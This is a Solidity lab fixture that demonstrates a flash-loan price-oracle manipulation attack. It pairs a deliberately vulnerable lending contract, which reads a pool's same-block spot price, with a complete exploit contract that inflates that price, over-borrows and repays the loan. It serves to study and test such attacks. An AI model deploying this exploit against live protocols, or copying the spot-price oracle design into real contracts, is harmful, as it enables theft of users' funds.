// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

interface IERC20OracleLab {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IOracleLending {
    function depositCollateral(uint256 amount) external;
    function borrow(uint256 amount) external;
}

/// @dev Unrestricted minting is intentional: this token only supports an isolated test fixture.
contract OracleLabToken is IERC20OracleLab {
    string public name;
    mapping(address => uint256) public override balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory tokenName) {
        name = tokenName;
    }

    function mint(address recipient, uint256 amount) external {
        balanceOf[recipient] += amount;
    }

    function approve(address spender, uint256 amount) external override returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function transferFrom(address owner, address recipient, uint256 amount) external override returns (bool) {
        uint256 approved = allowance[owner][msg.sender];
        require(approved >= amount, "allowance too low");
        allowance[owner][msg.sender] = approved - amount;
        _transfer(owner, recipient, amount);
        return true;
    }

    function _transfer(address owner, address recipient, uint256 amount) private {
        require(balanceOf[owner] >= amount, "balance too low");
        balanceOf[owner] -= amount;
        balanceOf[recipient] += amount;
    }
}

/// @dev A constant-product pool whose current reserve ratio is incorrectly used as a price oracle.
contract SpotPricePool {
    IERC20OracleLab public immutable collateralToken;
    IERC20OracleLab public immutable quoteToken;

    constructor(IERC20OracleLab collateral, IERC20OracleLab quote) {
        collateralToken = collateral;
        quoteToken = quote;
    }

    function spotPrice() external view returns (uint256) {
        uint256 collateralReserve = collateralToken.balanceOf(address(this));
        require(collateralReserve != 0, "empty collateral reserve");
        return quoteToken.balanceOf(address(this)) * 1e18 / collateralReserve;
    }

    function swapQuoteForCollateral(uint256 quoteIn, address recipient) external returns (uint256 collateralOut) {
        uint256 quoteReserve = quoteToken.balanceOf(address(this));
        uint256 collateralReserve = collateralToken.balanceOf(address(this));
        require(quoteIn != 0 && quoteReserve != 0 && collateralReserve != 0, "invalid swap");

        uint256 quoteAfterFee = quoteIn * 997;
        collateralOut = quoteAfterFee * collateralReserve / (quoteReserve * 1000 + quoteAfterFee);
        require(collateralOut != 0, "zero output");
        require(quoteToken.transferFrom(msg.sender, address(this), quoteIn), "quote transfer failed");
        require(collateralToken.transfer(recipient, collateralOut), "collateral transfer failed");
    }

    function swapCollateralForQuote(uint256 collateralIn, address recipient) external returns (uint256 quoteOut) {
        uint256 collateralReserve = collateralToken.balanceOf(address(this));
        uint256 quoteReserve = quoteToken.balanceOf(address(this));
        require(collateralIn != 0 && collateralReserve != 0 && quoteReserve != 0, "invalid swap");

        uint256 collateralAfterFee = collateralIn * 997;
        quoteOut = collateralAfterFee * quoteReserve / (collateralReserve * 1000 + collateralAfterFee);
        require(quoteOut != 0, "zero output");
        require(collateralToken.transferFrom(msg.sender, address(this), collateralIn), "collateral transfer failed");
        require(quoteToken.transfer(recipient, quoteOut), "quote transfer failed");
    }
}

interface IFlashLoanCallback {
    function onFlashLoan(uint256 amount, bytes calldata data) external;
}

/// @dev Zero-fee lender for a local atomic flash-loan demonstration.
contract TestFlashLender {
    IERC20OracleLab public immutable asset;

    constructor(IERC20OracleLab loanAsset) {
        asset = loanAsset;
    }

    function flashLoan(IFlashLoanCallback receiver, uint256 amount, bytes calldata data) external {
        uint256 balanceBefore = asset.balanceOf(address(this));
        require(balanceBefore >= amount, "loan unavailable");
        require(asset.transfer(address(receiver), amount), "loan transfer failed");
        receiver.onFlashLoan(amount, data);
        require(asset.balanceOf(address(this)) >= balanceBefore, "flash loan not repaid");
    }
}

/// @dev Deliberately reads the same-block spot price manipulated by the borrower.
contract SpotOracleLending {
    error InsufficientCollateral();
    error InsufficientLiquidity();
    error InvalidAmount();
    error RepayExceedsDebt();
    error PositionHealthy();

    IERC20OracleLab public immutable collateralToken;
    IERC20OracleLab public immutable quoteToken;
    SpotPricePool public immutable pool;
    uint256 public immutable ltvBps;
    uint256 public totalDebt;
    mapping(address => uint256) public collateralOf;
    mapping(address => uint256) public debtOf;

    constructor(IERC20OracleLab collateral, IERC20OracleLab quote, SpotPricePool pricePool, uint256 loanToValueBps) {
        collateralToken = collateral;
        quoteToken = quote;
        pool = pricePool;
        ltvBps = loanToValueBps;
    }

    function depositCollateral(uint256 amount) external {
        if (amount == 0) revert InvalidAmount();
        require(collateralToken.transferFrom(msg.sender, address(this), amount), "collateral transfer failed");
        collateralOf[msg.sender] += amount;
    }

    function borrow(uint256 amount) external {
        if (amount == 0) revert InvalidAmount();
        uint256 price = pool.spotPrice();
        uint256 collateralValue = collateralOf[msg.sender] * price / 1e18;
        if (debtOf[msg.sender] + amount > collateralValue * ltvBps / 10_000) revert InsufficientCollateral();
        if (quoteToken.balanceOf(address(this)) < amount) revert InsufficientLiquidity();

        debtOf[msg.sender] += amount;
        totalDebt += amount;
        require(quoteToken.transfer(msg.sender, amount), "quote transfer failed");
    }

    function repay(uint256 amount) external {
        if (amount == 0) revert InvalidAmount();
        uint256 debt = debtOf[msg.sender];
        if (amount > debt) revert RepayExceedsDebt();
        require(quoteToken.transferFrom(msg.sender, address(this), amount), "repayment transfer failed");
        debtOf[msg.sender] = debt - amount;
        totalDebt -= amount;
    }

    function withdrawCollateral(uint256 amount) external {
        uint256 collateral = collateralOf[msg.sender];
        if (amount == 0 || amount > collateral) revert InvalidAmount();
        uint256 remainingValue = (collateral - amount) * pool.spotPrice() / 1e18;
        if (debtOf[msg.sender] > remainingValue * ltvBps / 10_000) revert InsufficientCollateral();
        collateralOf[msg.sender] = collateral - amount;
        require(collateralToken.transfer(msg.sender, amount), "collateral transfer failed");
    }

    function liquidate(address borrower, uint256 repayAmount) external {
        uint256 price = pool.spotPrice();
        uint256 collateralValue = collateralOf[borrower] * price / 1e18;
        if (debtOf[borrower] <= collateralValue * ltvBps / 10_000) revert PositionHealthy();
        if (repayAmount == 0 || repayAmount > debtOf[borrower]) revert RepayExceedsDebt();

        require(quoteToken.transferFrom(msg.sender, address(this), repayAmount), "repayment transfer failed");
        debtOf[borrower] -= repayAmount;
        totalDebt -= repayAmount;
        uint256 seized = repayAmount * 1e18 / price * 10_500 / 10_000;
        if (seized > collateralOf[borrower]) seized = collateralOf[borrower];
        collateralOf[borrower] -= seized;
        require(collateralToken.transfer(msg.sender, seized), "seizure transfer failed");
    }
}

/// @dev Executes the manipulation and the over-borrow in one flash-loan callback.
contract OracleManipulationExploit is IFlashLoanCallback {
    IERC20OracleLab public immutable collateralToken;
    IERC20OracleLab public immutable quoteToken;
    SpotPricePool public immutable pool;
    TestFlashLender public immutable lender;
    IOracleLending public immutable lending;
    bool private positionOpened;

    constructor(
        IERC20OracleLab collateral,
        IERC20OracleLab quote,
        SpotPricePool pricePool,
        TestFlashLender flashLender,
        IOracleLending lendingProtocol
    ) {
        collateralToken = collateral;
        quoteToken = quote;
        pool = pricePool;
        lender = flashLender;
        lending = lendingProtocol;
        collateral.approve(address(lendingProtocol), type(uint256).max);
        quote.approve(address(pricePool), type(uint256).max);
        collateral.approve(address(pricePool), type(uint256).max);
    }

    function openPositionAndExploit(uint256 collateralDeposit, uint256 flashAmount, uint256 borrowAmount) external {
        require(!positionOpened, "position already opened");
        positionOpened = true;
        lending.depositCollateral(collateralDeposit);
        lender.flashLoan(this, flashAmount, abi.encode(borrowAmount));
    }

    function onFlashLoan(uint256 amount, bytes calldata data) external {
        require(msg.sender == address(lender), "only flash lender");
        uint256 borrowAmount = abi.decode(data, (uint256));

        uint256 acquiredCollateral = pool.swapQuoteForCollateral(amount, address(this));
        lending.borrow(borrowAmount);
        pool.swapCollateralForQuote(acquiredCollateral, address(this));
        require(quoteToken.transfer(address(lender), amount), "flash repayment failed");
    }
}
